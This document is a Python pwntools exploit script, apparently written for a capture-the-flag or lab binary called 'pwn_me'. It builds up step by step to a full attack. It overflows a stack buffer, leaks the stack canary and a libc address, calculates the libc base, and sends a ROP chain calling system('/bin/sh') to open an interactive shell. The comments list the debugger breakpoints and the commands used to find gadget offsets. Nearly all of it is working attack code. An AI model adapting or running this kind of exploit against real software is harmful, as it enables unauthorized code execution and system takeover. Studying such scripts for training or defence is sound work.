from pwn import *

p = process("./pwn_me")

def stack_smashing():
    input()
    # Look at when stack canary is loaded back in
    # b *do_echo+297, then look at RCX 
    print(p.recv())
    payload = b'\xff' +  b'A' * 8 + b'B' * 0x109 
    payload += b'C'*8 #This is the canary
    p.sendline(payload)
    print(p.recv())
    # Need to send this second packet to trigger the stack smashing message
    p.sendline(b'X'*8)
    print(p.recv())
    #input()

def stack_smashing2():
    # Look at when stack canary is loaded back in
    # b *do_echo+297, then look at RCX 
    input()
    print(p.recv())
    payload = b'\xff' +  b'A' * 8 + b'B' * 0x109 
    p.send(payload)
    print(p.recv())
    p.sendline(b'X'*8) #this is the canary
    print(p.recv())
    input()

def first_loop_twice():
    # b *do_echo+129 to check which loop going into
    # b *do_echo+151 to check arguments for first read in first loop
    # b *do_echo+297, then look at RCX to check stack canary 
    # x/20gx $rbp - 80 to look at activity around the base pointer
    input()
    print(p.recv())
    payload = b'\xff' #force first loop
    payload += b'A' * 8 #Number of bytes to write into buffer first and second time
    payload += b'\xff' #force first loop for second run through
    payload += b'B' * 8 #Number of bytes to write into buffer third time 
    payload += b'\xff' #force first loop for third run through
    payload += b'C' * (0x11b - len(payload))
    p.send(payload)
    print(p.recv())
    p.sendline(b'X'*8) #this is the canary
    print(p.recv())
    input()

def print_canary():
    # b *do_echo+129 to check which loop going into
    # b *do_echo+151 to check arguments for first read in first loop
    # b *do_echo+297, then look at RCX to check stack canary 
    # x/20gx $rbp - 80 to look at activity around the base pointer
    print("Start Receiving?")
    input()
    print(p.recv())
    payload = b'\xff' #force first loop
    #payload += b'A' * 8 #Number of bytes to write into buffer first and second time
    payload += struct.pack('Q', 0x200) #Number of bytes to be written to screen
    num_padding = 0x11b - len(payload) - 0x12
    payload += b'C' * (num_padding)
    print("Send Payload?")
    input()
    p.send(payload)
    received_stack = p.recv()
    canary_offset = num_padding+14 
    canary = received_stack[canary_offset: canary_offset+8]
    print("Canary: 0x{:x}".format(struct.unpack('Q',canary)[0]))
    #print("Received Stack:")
    #print(received_stack)
    print("Send Payload?")
    input()
    p.sendline(b'X'*8) 
    input()

def cycle_rip():
    print("Start Receiving?")
    input()
    print(p.recv())
    payload = b'\xff' #force first loop
    #payload += b'A' * 8 #Number of bytes to write into buffer first and second time
    payload += struct.pack('Q', 0x200) #Number of bytes to be written to screen
    num_padding = 0x11b - len(payload) - 0x12
    payload += b'C' * (num_padding)
    print("Send Canary Payload?")
    input()
    p.send(payload)
    received_stack = p.recv()
    canary_offset = num_padding+14 
    canary = received_stack[canary_offset: canary_offset+8]
    print("Canary: 0x{:x}".format(struct.unpack('Q',canary)[0]))
    #print("Received Stack:")
    #print(received_stack)
    print("Send Reset Payload?")
    input()
    p.sendline(b'X'*8) 
    print(p.recv())
    payload = b'\xff' +  b'A' * 8 + b'B' * 0x109 
    print("Send RIP Payload?")
    input()
    payload = b'\xff' +  b'A' * 8 + b'B' * 0x109 
    payload += canary 
    # b *do_echo+314
    '''
    #to check input
    $ python
    > from pwn import *
    > cyclic_find(b'caaadaaa') # 0x6161616461616163 ('caaadaaa')
    8
    '''
    payload += cyclic(1000)
    p.sendline(payload)
    print(p.recv())
    # Need to send this second packet to trigger the stack smashing message
    print("Send Trigger Payload?")
    input()
    p.sendline(b'X'*8)
    print(p.recv())

def take_control_rip():
    print("Start Receiving?")
    input()
    print(p.recv())
    payload = b'\xff' #force first loop
    #payload += b'A' * 8 #Number of bytes to write into buffer first and second time
    payload += struct.pack('Q', 0x200) #Number of bytes to be written to screen
    num_padding = 0x11b - len(payload) - 0x12
    payload += b'C' * (num_padding)
    print("Send Canary Payload?")
    input()
    p.send(payload)
    received_stack = p.recv()
    canary_offset = num_padding+14 
    canary = received_stack[canary_offset: canary_offset+8]
    print("Canary: 0x{:x}".format(struct.unpack('Q',canary)[0]))
    #print("Received Stack:")
    #print(received_stack)
    print("Send Reset Payload?")
    input()
    p.sendline(b'X'*8) 
    print(p.recv())
    payload = b'\xff' +  b'A' * 8 + b'B' * 0x109 
    print("Send RIP Payload?")
    input()
    payload = b'\xff' +  b'A' * 8 + b'B' * 0x109 
    payload += canary 
    # b *do_echo+314
    payload += b'D'*8 #RBP 
    payload += b'X'*8 #RIP 
    payload += b'E'*16
    p.sendline(payload)
    print(p.recv())
    # Need to send this second packet to trigger the stack smashing message
    print("Send Trigger Payload?")
    input()
    p.sendline(b'C'*8)
    print(p.recv())

def print_libc_addr():
    # b *do_echo+129 to check which loop going into
    # b *do_echo+151 to check arguments for first read in first loop
    # b *do_echo+297, then look at RCX to check stack canary 
    # x/20gx $rbp - 80 to look at activity around the base pointer
    print("Start Receiving?")
    input()
    print(p.recv())
    payload = b'\xff' #force first loop
    payload += struct.pack('Q', 0x200) #Number of bytes to be written to screen
    num_padding = 0x11b - len(payload) - 0x12
    payload += b'C' * (num_padding)
    print("Send Canary Payload?")
    input()
    p.send(payload)
    received_stack = p.recv()
    canary_offset = num_padding+14 
    libc_addr_offset = canary_offset + 8*4
    canary = received_stack[canary_offset: canary_offset+8]
    libc_addr = received_stack[libc_addr_offset: libc_addr_offset+8]
    print("Canary: 0x{:x}".format(struct.unpack('Q',canary)[0]))
    print("libc addr: 0x{:x}".format(struct.unpack('Q',libc_addr)[0]))
    print("Send Reset Payload?")
    input()
    p.sendline(b'X'*8) 
    print(p.recv())
    payload = b'\xff' +  b'A' * 8 + b'B' * 0x109 
    print("Send RIP Payload?")
    input()
    payload = b'\xff' +  b'A' * 8 + b'B' * 0x109 
    payload += canary 
    # b *do_echo+314
    payload += b'D'*8 #RBP 
    payload += b'X'*8 #RIP 
    payload += b'E'*16
    p.sendline(payload)
    print(p.recv())
    # Need to send this second packet to trigger the stack smashing message
    print("Send Trigger Payload?")
    input()
    p.sendline(b'C'*8)
    print(p.recv())

def pop_shell():
    # b *do_echo+314, to see where do_echo is returning to 
    print(p.recv())
    payload = b'\xff' #force first loop
    payload += struct.pack('Q', 0x200) #Number of bytes to be written to screen
    num_padding = 0x11b - len(payload) - 0x12
    payload += b'C' * (num_padding)
    p.send(payload)
    received_stack = p.recv()
    canary_offset = num_padding+14 
    libc_addr_offset = canary_offset + 8*4
    canary = received_stack[canary_offset: canary_offset+8]
    libc_addr_bytes = received_stack[libc_addr_offset: libc_addr_offset+8]
    libc_addr = struct.unpack('Q',libc_addr_bytes)[0]
    base_addr = libc_addr - 138135
    print("Canary: 0x{:x}".format(struct.unpack('Q',canary)[0]))
    print("libc addr: 0x{:x}".format(libc_addr))
    p.sendline(b'X'*8) 
    payload = b'\xff' +  b'A' * 8 + b'B' * 0x109 
    payload += canary 
    # b *do_echo+314
    payload += b'D'*8 #RBP 
    #strings -a -t x libc-2.27.so | grep bin
    bin_sh_offset = 0x1b3e9a 
    #objdump -d libc-2.27.so | grep "system"
    system_function_offset = 0x4f440
    #ROPgadget --binary libc-2.27.so > rops.txt
    #grep "pop rdi ; ret" rops.txt
    pop_rdi_ret_offset = 0x000000000002155f
    filler_rop = 0x00000000000b17c5 # for stack alignment
    payload += struct.pack('Q', base_addr + filler_rop)
    payload += struct.pack('Q', base_addr + pop_rdi_ret_offset)
    payload += struct.pack('Q', base_addr + bin_sh_offset)
    payload += struct.pack('Q', base_addr + system_function_offset)
    p.sendline(payload)
    p.interactive()

if __name__=='__main__':
    #stack_smashing()
    #stack_smashing2()
    #print_canary()
    #cycle_rip()
    #take_control_rip()
    #print_libc_addr()
    pop_shell()

